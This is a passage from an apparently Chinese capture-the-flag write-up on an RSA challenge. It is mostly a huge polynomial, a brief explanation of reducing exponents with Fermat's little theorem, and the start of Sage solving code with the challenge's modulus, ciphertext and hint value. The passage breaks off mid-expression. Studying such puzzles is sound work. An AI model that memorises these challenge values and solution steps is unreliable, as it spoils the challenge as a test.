class="number">13</span>*p**<span class="number">22</span> - <span class="number">4</span>*n**<span class="number">13</span>*p**<span class="number">20</span> - <span class="number">3</span>*n**<span class="number">13</span>*p**<span class="number">19</span> - <span class="number">4</span>*n**<span class="number">12</span>*p**<span class="number">39</span> + <span class="number">2</span>*n**<span class="number">12</span>*p**<span class="number">38</span> - n**<span class="number">12</span>*p**<span class="number">36</span> - <span class="number">3</span>*n**<span class="number">12</span>*p**<span class="number">35</span> - n**<span class="number">12</span>*p**<span class="number">34</span> - n**<span class="number">12</span>*p**<span class="number">33</span> - n**<span class="number">12</span>*p**<span class="number">32</span> + <span class="number">2</span>*n**<span class="number">12</span>*p**<span class="number">31</span> + <span class="number">2</span>*n**<span class="number">12</span>*p**<span class="number">30</span> + n**<span class="number">12</span>*p**<span class="number">28</span> - n**<span class="number">12</span>*p**<span class="number">27</span> + n**<span class="number">12</span>*p**<span class="number">26</span> - n**<span class="number">12</span>*p**<span class="number">25</span> + <span class="number">4</span>*n**<span class="number">12</span>*p**<span class="number">24</span> + n**<span class="number">12</span>*p**<span class="number">23</span> - n**<span class="number">12</span>*p**<span class="number">22</span> - <span class="number">2</span>*n**<span class="number">12</span>*p**<span class="number">21</span> - <span class="number">2</span>*n**<span class="number">12</span>*p**<span class="number">20</span> - n**<span class="number">11</span>*p**<span class="number">41</span> - <span class="number">4</span>*n**<span class="number">11</span>*p**<span class="number">40</span> + <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">39</span> + <span class="number">4</span>*n**<span class="number">11</span>*p**<span class="number">38</span> + n**<span class="number">11</span>*p**<span class="number">37</span> + <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">36</span> - <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">35</span> - n**<span class="number">11</span>*p**<span class="number">34</span> + <span class="number">3</span>*n**<span class="number">11</span>*p**<span class="number">33</span> + <span class="number">3</span>*n**<span class="number">11</span>*p**<span class="number">32</span> + n**<span class="number">11</span>*p**<span class="number">31</span> + <span class="number">6</span>*n**<span class="number">11</span>*p**<span class="number">30</span> + <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">27</span> + <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">26</span> - <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">25</span> + <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">24</span> - n**<span class="number">11</span>*p**<span class="number">23</span> - <span class="number">3</span>*n**<span class="number">11</span>*p**<span class="number">22</span> + <span class="number">3</span>*n**<span class="number">11</span>*p**<span class="number">21</span> - <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">42</span> + <span class="number">2</span>*n**<span class="number">10</span>*p**<span class="number">41</span> - <span class="number">5</span>*n**<span class="number">10</span>*p**<span class="number">39</span> - n**<span class="number">10</span>*p**<span class="number">37</span> - n**<span class="number">10</span>*p**<span class="number">36</span> - <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">35</span> + <span class="number">2</span>*n**<span class="number">10</span>*p**<span class="number">34</span> - <span class="number">2</span>*n**<span class="number">10</span>*p**<span class="number">33</span> + n**<span class="number">10</span>*p**<span class="number">32</span> + <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">31</span> + <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">30</span> + <span class="number">2</span>*n**<span class="number">10</span>*p**<span class="number">29</span> + <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">28</span> + <span class="number">4</span>*n**<span class="number">10</span>*p**<span class="number">27</span> + n**<span class="number">10</span>*p**<span class="number">26</span> - <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">25</span> - n**<span class="number">10</span>*p**<span class="number">24</span> + <span class="number">2</span>*n**<span class="number">10</span>*p**<span class="number">23</span> - n**<span class="number">9</span>*p**<span class="number">43</span> - <span class="number">3</span>*n**<span class="number">9</span>*p**<span class="number">42</span> + <span class="number">2</span>*n**<span class="number">9</span>*p**<span class="number">41</span> - n**<span class="number">9</span>*p**<span class="number">40</span> + <span class="number">2</span>*n**<span class="number">9</span>*p**<span class="number">39</span> - <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">38</span> + n**<span class="number">9</span>*p**<span class="number">37</span> + <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">36</span> - <span class="number">5</span>*n**<span class="number">9</span>*p**<span class="number">35</span> - <span class="number">2</span>*n**<span class="number">9</span>*p**<span class="number">34</span> + n**<span class="number">9</span>*p**<span class="number">33</span> + <span class="number">3</span>*n**<span class="number">9</span>*p**<span class="number">32</span> - <span class="number">5</span>*n**<span class="number">9</span>*p**<span class="number">31</span> + <span class="number">3</span>*n**<span class="number">9</span>*p**<span class="number">30</span> + <span class="number">3</span>*n**<span class="number">9</span>*p**<span class="number">28</span> + <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">27</span> - <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">26</span> - <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">25</span> - n**<span class="number">9</span>*p**<span class="number">24</span> + <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">23</span> + <span class="number">3</span>*n**<span class="number">8</span>*p**<span class="number">47</span> - <span class="number">3</span>*n**<span class="number">8</span>*p**<span class="number">46</span> - <span class="number">3</span>*n**<span class="number">8</span>*p**<span class="number">44</span> - <span class="number">5</span>*n**<span class="number">8</span>*p**<span class="number">43</span> + n**<span class="number">8</span>*p**<span class="number">42</span> + n**<span class="number">8</span>*p**<span class="number">41</span> + <span class="number">2</span>*n**<span class="number">8</span>*p**<span class="number">40</span> - <span class="number">5</span>*n**<span class="number">8</span>*p**<span class="number">39</span> - n**<span class="number">8</span>*p**<span class="number">36</span> + <span class="number">2</span>*n**<span class="number">8</span>*p**<span class="number">35</span> - n**<span class="number">8</span>*p**<span class="number">33</span> + <span class="number">5</span>*n**<span class="number">8</span>*p**<span class="number">32</span> - n**<span class="number">8</span>*p**<span class="number">31</span> + n**<span class="number">8</span>*p**<span class="number">30</span> + <span class="number">3</span>*n**<span class="number">8</span>*p**<span class="number">29</span> + <span class="number">2</span>*n**<span class="number">8</span>*p**<span class="number">27</span> - <span class="number">2</span>*n**<span class="number">8</span>*p**<span class="number">26</span> + n**<span class="number">8</span>*p**<span class="number">25</span> - <span class="number">2</span>*n**<span class="number">8</span>*p**<span class="number">24</span> - <span class="number">4</span>*n**<span class="number">7</span>*p**<span class="number">49</span> - <span class="number">3</span>*n**<span class="number">7</span>*p**<span class="number">48</span> - n**<span class="number">7</span>*p**<span class="number">47</span> - <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">45</span> - <span class="number">3</span>*n**<span class="number">7</span>*p**<span class="number">44</span> - n**<span class="number">7</span>*p**<span class="number">42</span> - n**<span class="number">7</span>*p**<span class="number">40</span> + n**<span class="number">7</span>*p**<span class="number">39</span> + <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">38</span> + <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">36</span> - <span class="number">3</span>*n**<span class="number">7</span>*p**<span class="number">35</span> + <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">33</span> - <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">32</span> - <span class="number">4</span>*n**<span class="number">7</span>*p**<span class="number">31</span> - n**<span class="number">7</span>*p**<span class="number">30</span> + n**<span class="number">7</span>*p**<span class="number">29</span> - <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">27</span> + <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">26</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">50</span> + n**<span class="number">6</span>*p**<span class="number">49</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">48</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">47</span> + n**<span class="number">6</span>*p**<span class="number">46</span> + n**<span class="number">6</span>*p**<span class="number">44</span> - n**<span class="number">6</span>*p**<span class="number">43</span> - n**<span class="number">6</span>*p**<span class="number">42</span> - n**<span class="number">6</span>*p**<span class="number">41</span> + <span class="number">4</span>*n**<span class="number">6</span>*p**<span class="number">40</span> - n**<span class="number">6</span>*p**<span class="number">39</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">38</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">37</span> - n**<span class="number">6</span>*p**<span class="number">36</span> - n**<span class="number">6</span>*p**<span class="number">35</span> - <span class="number">3</span>*n**<span class="number">6</span>*p**<span class="number">34</span> + <span class="number">5</span>*n**<span class="number">6</span>*p**<span class="number">33</span> - n**<span class="number">6</span>*p**<span class="number">32</span> + <span class="number">3</span>*n**<span class="number">6</span>*p**<span class="number">31</span> + <span class="number">3</span>*n**<span class="number">6</span>*p**<span class="number">30</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">29</span> + <span class="number">4</span>*n**<span class="number">6</span>*p**<span class="number">28</span> - n**<span class="number">6</span>*p**<span class="number">27</span> - <span class="number">3</span>*n**<span class="number">6</span>*p**<span class="number">26</span> - n**<span class="number">5</span>*p**<span class="number">52</span> - <span class="number">2</span>*n**<span class="number">5</span>*p**<span class="number">51</span> - n**<span class="number">5</span>*p**<span class="number">50</span> - <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">49</span> - n**<span class="number">5</span>*p**<span class="number">46</span> - n**<span class="number">5</span>*p**<span class="number">45</span> - <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">44</span> - n**<span class="number">5</span>*p**<span class="number">43</span> - <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">42</span> + <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">41</span> - <span class="number">2</span>*n**<span class="number">5</span>*p**<span class="number">40</span> + n**<span class="number">5</span>*p**<span class="number">39</span> + <span class="number">2</span>*n**<span class="number">5</span>*p**<span class="number">38</span> + n**<span class="number">5</span>*p**<span class="number">37</span> - n**<span class="number">5</span>*p**<span class="number">36</span> - n**<span class="number">5</span>*p**<span class="number">35</span> + n**<span class="number">5</span>*p**<span class="number">32</span> - n**<span class="number">5</span>*p**<span class="number">31</span> + <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">30</span> + <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">29</span> - <span class="number">2</span>*n**<span class="number">5</span>*p**<span class="number">28</span> + <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">55</span> - n**<span class="number">4</span>*p**<span class="number">54</span> - n**<span class="number">4</span>*p**<span class="number">53</span> + <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">52</span> + n**<span class="number">4</span>*p**<span class="number">51</span> + <span class="number">5</span>*n**<span class="number">4</span>*p**<span class="number">50</span> - n**<span class="number">4</span>*p**<span class="number">49</span> + <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">45</span> + <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">44</span> - <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">42</span> - n**<span class="number">4</span>*p**<span class="number">41</span> - n**<span class="number">4</span>*p**<span class="number">40</span> - <span class="number">3</span>*n**<span class="number">4</span>*p**<span class="number">39</span> - <span class="number">5</span>*n**<span class="number">4</span>*p**<span class="number">38</span> - n**<span class="number">4</span>*p**<span class="number">37</span> + n**<span class="number">4</span>*p**<span class="number">36</span> - n**<span class="number">4</span>*p**<span class="number">34</span> + n**<span class="number">4</span>*p**<span class="number">33</span> - <span class="number">4</span>*n**<span class="number">4</span>*p**<span class="number">32</span> + <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">30</span> - <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">29</span> - <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">28</span> + <span class="number">7</span>*n**<span class="number">3</span>*p**<span class="number">57</span> + <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">56</span> + <span class="number">3</span>*n**<span class="number">3</span>*p**<span class="number">55</span> + n**<span class="number">3</span>*p**<span class="number">54</span> - <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">53</span> + n**<span class="number">3</span>*p**<span class="number">52</span> - n**<span class="number">3</span>*p**<span class="number">50</span> - n**<span class="number">3</span>*p**<span class="number">49</span> - <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">48</span> - <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">46</span> + <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">45</span> + <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">43</span> - n**<span class="number">3</span>*p**<span class="number">42</span> - n**<span class="number">3</span>*p**<span class="number">41</span> + n**<span class="number">3</span>*p**<span class="number">40</span> + n**<span class="number">3</span>*p**<span class="number">38</span> + n**<span class="number">3</span>*p**<span class="number">37</span> - <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">36</span> - <span class="number">3</span>*n**<span class="number">3</span>*p**<span class="number">35</span> - <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">34</span> + <span class="number">6</span>*n**<span class="number">3</span>*p**<span class="number">32</span> + n**<span class="number">3</span>*p**<span class="number">31</span> - <span class="number">3</span>*n**<span class="number">3</span>*p**<span class="number">30</span> + <span class="number">3</span>*n**<span class="number">3</span>*p**<span class="number">29</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">59</span> + <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">58</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">56</span> + n**<span class="number">2</span>*p**<span class="number">54</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">53</span> + n**<span class="number">2</span>*p**<span class="number">52</span> + <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">51</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">50</span> - n**<span class="number">2</span>*p**<span class="number">49</span> - n**<span class="number">2</span>*p**<span class="number">47</span> - n**<span class="number">2</span>*p**<span class="number">46</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">45</span> - <span class="number">3</span>*n**<span class="number">2</span>*p**<span class="number">44</span> + n**<span class="number">2</span>*p**<span class="number">43</span> + <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">42</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">41</span> + n**<span class="number">2</span>*p**<span class="number">40</span> + <span class="number">5</span>*n**<span class="number">2</span>*p**<span class="number">39</span> + <span class="number">3</span>*n**<span class="number">2</span>*p**<span class="number">35</span> + n**<span class="number">2</span>*p**<span class="number">33</span> + <span class="number">6</span>*n**<span class="number">2</span>*p**<span class="number">32</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">31</span> + n**<span class="number">2</span>*p**<span class="number">30</span> - n*p**<span class="number">61</span> - <span class="number">3</span>*n*p**<span class="number">60</span> - n*p**<span class="number">59</span> + <span class="number">3</span>*n*p**<span class="number">58</span> + n*p**<span class="number">57</span> + n*p**<span class="number">56</span> + <span class="number">2</span>*n*p**<span class="number">54</span> - n*p**<span class="number">53</span> + <span class="number">2</span>*n*p**<span class="number">52</span> - n*p**<span class="number">51</span> + <span class="number">2</span>*n*p**<span class="number">50</span> - <span class="number">4</span>*n*p**<span class="number">47</span> + n*p**<span class="number">46</span> + <span class="number">3</span>*n*p**<span class="number">45</span> + n*p**<span class="number">44</span> + n*p**<span class="number">43</span> + n*p**<span class="number">42</span> + n*p**<span class="number">41</span> - <span class="number">2</span>*n*p**<span class="number">40</span> - <span class="number">3</span>*n*p**<span class="number">39</span> - n*p**<span class="number">38</span> - <span class="number">3</span>*n*p**<span class="number">35</span> - <span class="number">2</span>*n*p**<span class="number">34</span> - <span class="number">2</span>*n*p**<span class="number">33</span> - n*p**<span class="number">32</span> + <span class="number">2</span>*n*p**<span class="number">31</span> + p**<span class="number">63</span> - <span class="number">2</span>*p**<span class="number">62</span> - <span class="number">2</span>*p**<span class="number">61</span> + <span class="number">3</span>*p**<span class="number">60</span> + p**<span class="number">59</span> + <span class="number">3</span>*p**<span class="number">57</span> - p**<span class="number">56</span> + p**<span class="number">55</span> - p**<span class="number">54</span> - <span class="number">3</span>*p**<span class="number">53</span> + p**<span class="number">52</span> - p**<span class="number">50</span> - p**<span class="number">49</span> - <span class="number">3</span>*p**<span class="number">48</span> - p**<span class="number">47</span> - p**<span class="number">46</span> + <span class="number">3</span>*p**<span class="number">44</span> - p**<span class="number">42</span> + <span class="number">4</span>*p**<span class="number">41</span> + <span class="number">2</span>*p**<span class="number">40</span> + <span class="number">2</span>*p**<span class="number">39</span> - <span class="number">4</span>*p**<span class="number">38</span> + p**<span class="number">37</span> + <span class="number">2</span>*p**<span class="number">36</span> - <span class="number">5</span>*p**<span class="number">35</span> + <span class="number">2</span>*p**<span class="number">34</span> - <span class="number">2</span>*p**<span class="number">33</span> - <span class="number">2</span>*p**<span class="number">32</span></span><br></pre></td></tr></table></figure>

<p>但这里的推导与EZ_Fermat有所不同。消去q后，我们有2$^{f(p)*p^{32}}$$\equiv$w$^{p^{32}}$mod(n),由费马小定理可以推得2$^{f(p)<em>p^{32}}$$\equiv$w mod(p).需要将指数换元为（x-1）的形式才能应用费马小定理进行化简。比如2$^{p</em>n^{32}}$化为2$^{(p-1)<em>n^{32}}$此时等式右边就要乘一个2$^{-1</em>n^{32}}$，以此类推即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">95656952327201449381426394713246214670537600365883923624876350719801926817916514429721785287844335184715049179879891389941974481490433975689601829920289485889138252888029716516069912637121531561601839948367426922036690701168975937162280451323099126372019216020898338909808577022618554997063496690156977790629</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">32384071331939239285992149489589967884022349189352515487950255250160126611084915524664364190130039873461090810189570222748422757594726643684332100753373557666031160718150203596579825955216919802911458293840557069152132506518827761626306871971480050052005979083878379439210757328323337697175682026549870910934</span></span><br><span class="line">w = <span class="number">12796020294902567574981427270787776254781813995526831579805652479456168245098217943847166109912113827479436654134179666391771173421469188197935460525521295192736123648410762964187396897298542198935971755852754544978564521188423737649175136194386664628304164316905741781089536713701674793641345344818309314224</span></span><br><span class="line"></span><br><span class="line">P.&lt;n,p&gt; = PolynomialRing(ZZ)</span><br><span class="line">n, p = P.gens()</span><br><span class="line">f = n**<span class="number">31</span>*p + <span class="number">2</span>*n**<span class="number">30</span>*p**<span class="number">3</span> - n**<span class="number">30</span>*p**<span class="number">2</span> - n**<span class="number">29</span>*p**<span class="number">3</span> + n**<span class="number">28</span>*p**<span class="number">7</span> - <span class="number">2</span>*n**<span class="number">28</span>*p**<span class="number">6</span> + <span class="number">2</span>*n**<span class="number">28</span>*p**<span class="number">5</span> - n**<span class="number">28</span>*p**<span class="number">4</span> + <span class="number">6</span>*n**<span class="number">27</span>*p**<span class="number">9</span> - <span class="number">2</span>*n**<span class="number">27</span>*p**<span class="number">8</span> - n**<span class="number">27</span>*p**<span class="number">7</span> - n**<span class="number">27</span>*p**<span class="number">6</span> - <span class="number">2</span>*n**<span class="number">27</span>*p**<span class="number">5</span> - n**<span class="number">26</span>*p**<span class="number">10</span> - <span class="number">5</span>*n**<span class="number">26</span>*p**<span class="number">9</span> + n**<span class="number">26</span>*p**<span class="number">8</span> + <span class="number">2</span>*n**<span class="number">26</span>*p**<span class="number">7</span> - <span class="number">3</span>*n**<span class="number">26</span>*p**<span class="number">6</span> + n**<span class="number">25</span>*p**<span class="number">13</span> + n**<span class="number">25</span>*p**<span class="number">12</span> + n**<span class="number">25</span>*p**<span class="number">10</span> + <span class="number">2</span>*n**<span class="number">25</span>*p**<span class="number">9</span> - <span class="number">3</span>*n**<span class="number">25</span>*p**<span class="number">8</span> - <span class="number">2</span>*n**<span class="number">25</span>*p**<span class="number">7</span> + <span class="number">5</span>*n**<span class="number">24</span>*p**<span class="number">15</span> + <span class="number">3</span>*n**<span class="number">24</span>*p**<span class="number">13</span> - n**<span class="number">24</span>*p**<span class="number">12</span> + <span class="number">4</span>*n**<span class="number">24</span>*p**<span class="number">11</span> + n**<span class="number">24</span>*p**<span class="number">10</span> + <span class="number">5</span>*n**<span class="number">24</span>*p**<span class="number">9</span> - n**<span class="number">24</span>*p**<span class="number">8</span> + n**<span class="number">23</span>*p**<span class="number">16</span> - <span class="number">2</span>*n**<span class="number">23</span>*p**<span class="number">15</span> + n**<span class="number">23</span>*p**<span class="number">14</span> + <span class="number">3</span>*n**<span class="number">23</span>*p**<span class="number">12</span> - <span class="number">5</span>*n**<span class="number">23</span>*p**<span class="number">10</span> - <span class="number">4</span>*n**<span class="number">23</span>*p**<span class="number">9</span> - <span class="number">3</span>*n**<span class="number">22</span>*p**<span class="number">19</span> + <span class="number">2</span>*n**<span class="number">22</span>*p**<span class="number">18</span> - <span class="number">5</span>*n**<span class="number">22</span>*p**<span class="number">17</span> - n**<span class="number">22</span>*p**<span class="number">16</span> + n**<span class="number">22</span>*p**<span class="number">15</span> + n**<span class="number">22</span>*p**<span class="number">13</span> + <span class="number">2</span>*n**<span class="number">22</span>*p**<span class="number">12</span> - n**<span class="number">22</span>*p**<span class="number">11</span> + <span class="number">3</span>*n**<span class="number">22</span>*p**<span class="number">10</span> + n**<span class="number">21</span>*p**<span class="number">20</span> - <span class="number">2</span>*n**<span class="number">21</span>*p**<span class="number">19</span> - <span class="number">2</span>*n**<span class="number">21</span>*p**<span class="number">18</span> - <span class="number">2</span>*n**<span class="number">21</span>*p**<span class="number">17</span> - n**<span class="number">21</span>*p**<span class="number">16</span> + n**<span class="number">21</span>*p**<span class="number">15</span> - n**<span class="number">21</span>*p**<span class="number">13</span> + <span class="number">2</span>*n**<span class="number">21</span>*p**<span class="number">12</span> - <span class="number">2</span>*n**<span class="number">21</span>*p**<span class="number">11</span> - <span class="number">2</span>*n**<span class="number">20</span>*p**<span class="number">23</span> - n**<span class="number">20</span>*p**<span class="number">22</span> - n**<span class="number">20</span>*p**<span class="number">21</span> + n**<span class="number">20</span>*p**<span class="number">20</span> - <span class="number">2</span>*n**<span class="number">20</span>*p**<span class="number">18</span> - n**<span class="number">20</span>*p**<span class="number">17</span> + n**<span class="number">20</span>*p**<span class="number">16</span> - <span class="number">5</span>*n**<span class="number">20</span>*p**<span class="number">15</span> + <span class="number">2</span>*n**<span class="number">20</span>*p**<span class="number">14</span> - <span class="number">2</span>*n**<span class="number">20</span>*p**<span class="number">13</span> + n**<span class="number">19</span>*p**<span class="number">25</span> - <span class="number">3</span>*n**<span class="number">19</span>*p**<span class="number">24</span> - <span class="number">2</span>*n**<span class="number">19</span>*p**<span class="number">22</span> - n**<span class="number">19</span>*p**<span class="number">19</span> + <span class="number">4</span>*n**<span class="number">19</span>*p**<span class="number">18</span> + n**<span class="number">19</span>*p**<span class="number">16</span> - <span class="number">3</span>*n**<span class="number">19</span>*p**<span class="number">15</span> + <span class="number">3</span>*n**<span class="number">19</span>*p**<span class="number">14</span> + <span class="number">2</span>*n**<span class="number">19</span>*p**<span class="number">13</span> + n**<span class="number">18</span>*p**<span class="number">27</span> - <span class="number">2</span>*n**<span class="number">18</span>*p**<span class="number">26</span> + <span class="number">5</span>*n**<span class="number">18</span>*p**<span class="number">25</span> + n**<span class="number">18</span>*p**<span class="number">24</span> - <span class="number">4</span>*n**<span class="number">18</span>*p**<span class="number">23</span> - <span class="number">2</span>*n**<span class="number">18</span>*p**<span class="number">20</span> - <span class="number">4</span>*n**<span class="number">18</span>*p**<span class="number">19</span> - n**<span class="number">18</span>*p**<span class="number">16</span> + n**<span class="number">17</span>*p**<span class="number">29</span> + n**<span class="number">17</span>*p**<span class="number">27</span> - <span class="number">2</span>*n**<span class="number">17</span>*p**<span class="number">26</span> + <span class="number">2</span>*n**<span class="number">17</span>*p**<span class="number">25</span> - n**<span class="number">17</span>*p**<span class="number">23</span> - <span class="number">2</span>*n**<span class="number">17</span>*p**<span class="number">22</span> - <span class="number">2</span>*n**<span class="number">17</span>*p**<span class="number">21</span> + n**<span class="number">17</span>*p**<span class="number">19</span> + n**<span class="number">17</span>*p**<span class="number">18</span> + n**<span class="number">17</span>*p**<span class="number">17</span> - <span class="number">2</span>*n**<span class="number">17</span>*p**<span class="number">16</span> - n**<span class="number">16</span>*p**<span class="number">31</span> - n**<span class="number">16</span>*p**<span class="number">30</span> + n**<span class="number">16</span>*p**<span class="number">29</span> + <span class="number">2</span>*n**<span class="number">16</span>*p**<span class="number">28</span> + <span class="number">3</span>*n**<span class="number">16</span>*p**<span class="number">27</span> - n**<span class="number">16</span>*p**<span class="number">26</span> - n**<span class="number">16</span>*p**<span class="number">25</span> - n**<span class="number">16</span>*p**<span class="number">24</span> + <span class="number">2</span>*n**<span class="number">16</span>*p**<span class="number">23</span> + <span class="number">2</span>*n**<span class="number">16</span>*p**<span class="number">22</span> + n**<span class="number">16</span>*p**<span class="number">21</span> + <span class="number">4</span>*n**<span class="number">16</span>*p**<span class="number">20</span> + <span class="number">2</span>*n**<span class="number">16</span>*p**<span class="number">18</span> + n**<span class="number">16</span>*p**<span class="number">17</span> - <span class="number">4</span>*n**<span class="number">15</span>*p**<span class="number">33</span> + n**<span class="number">15</span>*p**<span class="number">32</span> + n**<span class="number">15</span>*p**<span class="number">31</span> + n**<span class="number">15</span>*p**<span class="number">30</span> + n**<span class="number">15</span>*p**<span class="number">29</span> + <span class="number">4</span>*n**<span class="number">15</span>*p**<span class="number">28</span> + <span class="number">2</span>*n**<span class="number">15</span>*p**<span class="number">26</span> - n**<span class="number">15</span>*p**<span class="number">25</span> - n**<span class="number">15</span>*p**<span class="number">24</span> + n**<span class="number">15</span>*p**<span class="number">23</span> + <span class="number">2</span>*n**<span class="number">15</span>*p**<span class="number">22</span> - <span class="number">4</span>*n**<span class="number">15</span>*p**<span class="number">21</span> + <span class="number">2</span>*n**<span class="number">15</span>*p**<span class="number">20</span> - <span class="number">3</span>*n**<span class="number">15</span>*p**<span class="number">19</span> - <span class="number">3</span>*n**<span class="number">15</span>*p**<span class="number">18</span> - <span class="number">5</span>*n**<span class="number">14</span>*p**<span class="number">35</span> + n**<span class="number">14</span>*p**<span class="number">33</span> - <span class="number">2</span>*n**<span class="number">14</span>*p**<span class="number">32</span> - n**<span class="number">14</span>*p**<span class="number">31</span> - n**<span class="number">14</span>*p**<span class="number">30</span> - <span class="number">2</span>*n**<span class="number">14</span>*p**<span class="number">29</span> + <span class="number">4</span>*n**<span class="number">14</span>*p**<span class="number">28</span> - <span class="number">2</span>*n**<span class="number">14</span>*p**<span class="number">27</span> + <span class="number">3</span>*n**<span class="number">14</span>*p**<span class="number">23</span> - n**<span class="number">14</span>*p**<span class="number">22</span> + n**<span class="number">14</span>*p**<span class="number">20</span> + <span class="number">3</span>*n**<span class="number">14</span>*p**<span class="number">18</span> + n**<span class="number">13</span>*p**<span class="number">37</span> + n**<span class="number">13</span>*p**<span class="number">35</span> - <span class="number">3</span>*n**<span class="number">13</span>*p**<span class="number">34</span> - <span class="number">4</span>*n**<span class="number">13</span>*p**<span class="number">33</span> + <span class="number">2</span>*n**<span class="number">13</span>*p**<span class="number">32</span> + <span class="number">2</span>*n**<span class="number">13</span>*p**<span class="number">31</span> - <span class="number">2</span>*n**<span class="number">13</span>*p**<span class="number">29</span> - n**<span class="number">13</span>*p**<span class="number">28</span> + n**<span class="number">13</span>*p**<span class="number">26</span> - n**<span class="number">13</span>*p**<span class="number">25</span> + n**<span class="number">13</span>*p**<span class="number">23</span> + <span class="number">2</span>*n**<span class="number">13</span>*p**<span class="number">22</span> - <span class="number">4</span>*n**<span class="number">13</span>*p**<span class="number">20</span> - <span class="number">3</span>*n**<span class="number">13</span>*p**<span class="number">19</span> - <span class="number">4</span>*n**<span class="number">12</span>*p**<span class="number">39</span> + <span class="number">2</span>*n**<span class="number">12</span>*p**<span class="number">38</span> - n**<span class="number">12</span>*p**<span class="number">36</span> - <span class="number">3</span>*n**<span class="number">12</span>*p**<span class="number">35</span> - n**<span class="number">12</span>*p**<span class="number">34</span> - n**<span class="number">12</span>*p**<span class="number">33</span> - n**<span class="number">12</span>*p**<span class="number">32</span> + <span class="number">2</span>*n**<span class="number">12</span>*p**<span class="number">31</span> + <span class="number">2</span>*n**<span class="number">12</span>*p**<span class="number">30</span> + n**<span class="number">12</span>*p**<span class="number">28</span> - n**<span class="number">12</span>*p**<span class="number">27</span> + n**<span class="number">12</span>*p**<span class="number">26</span> - n**<span class="number">12</span>*p**<span class="number">25</span> + <span class="number">4</span>*n**<span class="number">12</span>*p**<span class="number">24</span> + n**<span class="number">12</span>*p**<span class="number">23</span> - n**<span class="number">12</span>*p**<span class="number">22</span> - <span class="number">2</span>*n**<span class="number">12</span>*p**<span class="number">21</span> - <span class="number">2</span>*n**<span class="number">12</span>*p**<span class="number">20</span> - n**<span class="number">11</span>*p**<span class="number">41</span> - <span class="number">4</span>*n**<span class="number">11</span>*p**<span class="number">40</span> + <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">39</span> + <span class="number">4</span>*n**<span class="number">11</span>*p**<span class="number">38</span> + n**<span class="number">11</span>*p**<span class="number">37</span> + <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">36</span> - <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">35</span> - n**<span class="number">11</span>*p**<span class="number">34</span> + <span class="number">3</span>*n**<span class="number">11</span>*p**<span class="number">33</span> + <span class="number">3</span>*n**<span class="number">11</span>*p**<span class="number">32</span> + n**<span class="number">11</span>*p**<span class="number">31</span> + <span class="number">6</span>*n**<span class="number">11</span>*p**<span class="number">30</span> + <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">27</span> + <span 